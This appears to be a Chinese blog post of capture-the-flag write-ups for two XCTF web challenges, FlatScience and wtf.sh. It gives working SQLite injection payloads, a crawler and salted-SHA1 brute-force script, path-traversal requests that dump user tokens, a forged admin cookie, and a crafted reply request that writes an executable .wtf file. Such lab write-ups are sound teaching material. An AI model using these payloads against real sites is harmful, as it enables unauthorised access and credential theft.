---
title: XCTF攻防世界web部分writeup
date: 2019-05-01 18:15:34
tags: writeup
---

adword里面题目很多，挑一些题目来记录



## FlatScience

进入题目界面

![](https://qqx.im/mdimage/adword/paper.png)

随便点点之后，发现是一些网站。对付这种，使用Burpsuite的**Send to Spiders**功能



![](https://qqx.im/mdimage/adword/spider.png)

可以看到有login.php和admin.php和robots.txt，访问robots.txt里面也是login.php和admin.php,所以分别访问login.php和admin.php

看到**登录框**自然是想要SQL注入fuzz一波。提交admin'会**报错**

> **Warning**:  SQLite3::query(): Unable to prepare statement: 1, near "fa27f6dc1fec7b2c54fd77ce7f0118fb2a3ab180": syntax error in **/var/www/html/login.php** on line **47**

再提交admin' or '1'='1'--可以成功登录，跳到主页。发现还是没有什么，回登录界面查看。抓包提交发现源代码有tips

```
<!-- TODO: Remove ?debug-Parameter! -->
```

加上这个参数提交得到源码

```php
<?php
ob_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! --> 
```

简单的拼接逻辑，并且会在cookie中回显。

那就查看一下sqlite的注入方式，[参考链接](http://www.sohu.com/a/256295275_609556)

列数可以从代码中看出来为2，接下来爆表。sqlite没库的概念，可以直接获得表名

> usr=admin' union select 1,name from sqlite_master where type='table' limit 0,1--&pw=1

![](https://qqx.im/mdimage/adword/attack.png)

这里只有一个表，如果想报全部的表可以用burpsuite修改limit后面的参数。

接下来报列

> usr=admin' union select 1,sql from sqlite_master where type='table' limit 0,1--&pw=1

结果：

> name= CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))

看hint

> usr=2' union select 1,hint from Users where name='admin'--&pw=1

结果

> name= my fav word in my fav paper?!;

获得admin密码

> usr=2' union select 1,password from Users where name='admin'--&pw=1

结果

> 3fab54a50e770d830c0416df817567662a9dc85c

cmd5查不到，行吧，要去paper里找。一个一个找和一个一个单词去试，这题可能明年才做得出来。那就写个爬虫脚本和解析pdf单词爆破密码的脚本

爬虫脚本

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : python.py
# @Software: PyCharm

import pybloom_live
import queue
import requests
import re
from urllib.parse import urljoin
from function import download_pdf,get_ext


target_url = 'http://111.198.29.45:45002/1/index.html'
q = queue.Queue()
# init the queue
q.put(target_url)
# bloom filter init
f = pybloom_live.BloomFilter(capacity=1000, error_rate=0.001)

# 布隆过滤器 去除重复url
def bloom(base_url, urls):
    for i in urls:
        new_url = urljoin(base_url, i)
        if not f.add(new_url):
            if get_ext(new_url) == '.pdf':
                download_pdf(new_url)
            else:
                q.put(new_url)



# 获取网页的所有内容
def get_content_urls(url):
    try:
        r = requests.get(url, timeout=15)
        text = r.text
        pattern = re.compile('<a.+?href=\"(.+?)\".+?>.+?<\/a>')
        urls = pattern.findall(text)
        # print(urls)
        bloom(url, urls)
    except requests.exceptions.MissingSchema as e:
        print("捕不完的异常")
    except requests.exceptions.ConnectTimeout as e:
        print("捕不完的异常")


if __name__ == '__main__':
    while not q.empty():
        url = q.get()
        print(url)
        get_content_urls(url)


```

用了一个队列和布隆过滤器，很快就爬完pdf了。

然后再写一个pdf解析器

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : readpdf.py
# @Software: PyCharm

from pdfminer.pdfparser import PDFParser,PDFDocument
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal,LAParams
from pdfminer.pdfinterp import PDFTextExtractionNotAllowed
import os
import re
from function import get_sha1



def get_pdf():
    return [i for i in os.listdir("./tmp") if i.endswith("pdf")]


def convert_pdf_2_text(path):
    with open(path, 'rb') as fp:
        # 用文件对象来创建一个pdf文档分析器
        praser = PDFParser(fp)
        # 创建一个PDF文档
        doc = PDFDocument()
        # 连接分析器 与文档对象
        praser.set_document(doc)
        doc.set_parser(praser)

        # 提供初始化密码
        # 如果没有密码 就创建一个空的字符串
        doc.initialize()

        # 检测文档是否提供txt转换，不提供就忽略
        if not doc.is_extractable:
            raise PDFTextExtractionNotAllowed
        else:
            # 创建PDf 资源管理器 来管理共享资源
            rsrcmgr = PDFResourceManager()
            # 创建一个PDF设备对象
            laparams = LAParams()
            device = PDFPageAggregator(rsrcmgr, laparams=laparams)
            # 创建一个PDF解释器对象
            interpreter = PDFPageInterpreter(rsrcmgr, device)

            res = ''
            # 循环遍历列表，每次处理一个page的内容
            for page in doc.get_pages():
                interpreter.process_page(page)
                # 接受该页面的LTPage对象
                layout = device.get_result()
                # 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，
                for x in layout:
                    if isinstance(x, LTTextBoxHorizontal):
                        res += x.get_text().strip()
                        # print(res)
            return res


def find_password():
    pdf_path = get_pdf()

    for i in pdf_path:
        print("Searching word in " + i)
        pdf_text = convert_pdf_2_text('tmp/'+i)
        # 这里的分隔符用空格和回车就够了，主要是分割出单词
        pdf_text = re.split(' | \n', pdf_text)
        for word in pdf_text:
            print(word)
            enc_word = word + 'Salz!'
            sha1_password = get_sha1(enc_word)
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == '__main__':
    find_password()

```

```python

def get_sha1(s):
    return hashlib.sha1(str(s).encode('utf-8')).hexdigest()
    
def download_pdf(url):
    r = requests.get(url, stream=True, timeout=15)

    filename = os.path.basename(url)
    with open('tmp/'+filename, 'wb') as fd:
        fd.write(r.content)
```

这脚本写了挺久，主要是一开始想着用多线程做生成者和消费者队列，结果发现爬虫本身就是自销自产。然后用布隆过滤器去重，防止爬虫死循环。

最后就可以跑出密码

>ThinJerboa
>Find the password :ThinJerboa

登录admin界面即可得到密码





## wtf.sh-150

访问题目界面，是个论坛

![](https://qqx.im/mdimage/adword/wtf.png)

探索了一下，有几个点

> 1. 有注册 登录功能
> 2. 有很多主题
> 3. 主题可以回复
> 4. 可以自己发布主题

既然有注册等等，那就是试试，顺便试试有没有SQL注入。FUZZ了一下，没有SQL注入，admin用户存在，flag可能跟admin有关。

对于有很多主题，那就是用Burpsuite的**Spider**看看有没有什么隐藏的东西。发现就是几个wtf模块，login post profile reply等。也没有试出什么信息。

第一波信息收集没收集到什么意思，而且与普通网站文件后缀也不同，是wtf。

回到题目首页，标题是

> Welcome to the wtf.sh Forums!

试着访问一下,发现显示出了wtf.sh的源码，审计一下

可以关注的点有几个

```bash
1. source lib.sh # import stdlib

2.	# include文件，如果是wtf文件 当成bash解析
    function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
    local line;
    while read -r line; do
    # check if we're in a script line or not ($ at the beginning implies script line)
    # also, our extension needs to be .wtf
    [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
    is_script=$?;

    # execute the line.
    if [[ $is_script = 0 ]]
    then
    cmd+=$'\n'"${line#"$"}";
    else
    if [[ -n $cmd ]]
    then
    eval "$cmd" || log "Error during execution of ${cmd}";
    cmd=""
    fi
    echo $line
    fi
    done < ${pathname}
    else
    echo "<p>Max include depth exceeded!<p>"
    fi
    }
3.  其它文件
	cp -R css index.wtf lib.sh login.wtf logout.wtf new_post.wtf new_user.wtf post.wtf post_functions.sh posts profile.wtf reply.wtf spinup.sh user_functions.sh users users_lookup wtf.sh "${sandbox_dir}";
```

根据上面的东西，先把其它源码给下下来审计。

```bash
1.lib.sh
	一些依赖函数
2.spinup.sh
	一些目录初始化的命令
3.user_functions.sh
	关于用户的一些操作，比如创建用户 登录等
4.post_functions.sh
	这里面有两个函数，一个是create_post,另一个是reply,根据函数名就可以猜得出功能
```

根据post_functions.sh里create_post的

```bash
local post_id=$(basename $(mktemp --directory posts/XXXXX));

echo ${username} > "posts/${post_id}/1";
echo ${title} >> "posts/${post_id}/1";
echo ${text} >> "posts/${post_id}/1";
```

可以知道，post_id是一个在posts下面的一个目录，并且会将内容写入该目录下的1文件里，而且没有做任何目录限制，那么就可以目录穿越，同时根据/post.wtf?post=K8laH是获取论坛主题内容，就可以知道会造成任意目录下的文件读取。

所以提交

```
http://111.198.29.45:44741/post.wtf?post=../
```

读取上一层的文件

![](https://qqx.im/mdimage/adword/wtf2.png)

内容过多，搜索一下flag关键字

![](https://qqx.im/mdimage/adword/get_flag1.png)

```bash
$ if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]] 
$ then $ get_flag1 $ fi $ fi 
```

可以得知，如果以admin登录，就会获得flag1。关于获得admin权限，第一就是获得密码，第二就是获得cookie。之前user_functions.sh里有关于用户的函数，返回去看看可知

```bash
# user files look like:
# username
# hashed_pass
# token
echo "${username}" > "users/${user_id}";
echo "${hashed_pass}" >> "users/${user_id}";
echo "${token}" >> "users/${user_id}";
```

会把hash_pass和token放入users/${user_id}，既然这样就可以直接读取

```
?post=../users
```

![](https://qqx.im/mdimage/adword/admin_token.png)

密码破解不出，用修改cookie的方式

```
Cookie: USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
```

然后访问profile得到flag1

![](https://qqx.im/mdimage/adword/admin_get_flag.png)

读了一下其它文件，发现没有get_flag2，所以应该就是要执行命令了。

结合wtf.sh的.wtf文件解析，就是要上传一个wtf文件。在post_funtions里reply提供了这个机会

```bash
function reply {
local post_id=$1;
local username=$2;
local text=$3;
local hashed=$(hash_username "${username}");

curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
next_file=(posts/${post_id}/${next_reply_id});
echo "${username}" > "${next_file}";
echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
echo "${text}" >> "${next_file}";

# add post this is in reply to to posts cache
echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

post_id是可控的，username text可控，

所以先注册一个$get_flag2用户，这是wtf解析导致的，$开头会被解析成bash。

然后抓包提交

```
// 这里的%20是空格，为了让echo "${username}" > posts/1.wtf /${next_reply_id}截断，这样我们的1.wtf就不会被当成文件夹，而是被当成文件，不存在也会被创建，然后写入
// 之所以写入users_lookup是因为users_lookup文件夹下面没有建立.nolist .noread,而posts下面有，所以无法访问其下的wtf。
POST /reply.wtf?post=../users_lookup/1.wtf%20
xxx

text=123456&submit=
```

然后访问users_lookup/1.wtf

![](https://qqx.im/mdimage/adword/get_flag2.png)

\>\>To be continue



